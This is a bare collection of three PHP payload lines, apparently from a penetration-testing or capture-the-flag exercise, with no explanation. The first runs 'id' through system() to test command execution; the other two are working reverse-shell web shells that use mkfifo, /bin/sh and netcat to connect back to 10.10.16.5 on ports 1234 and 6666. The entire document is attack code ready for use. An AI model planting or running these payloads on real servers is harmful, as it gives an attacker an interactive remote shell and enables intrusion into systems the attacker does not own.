<?php system('id') ?>

<?php system('rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f') ?>

<?php system('rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 6666 >/tmp/f') ?>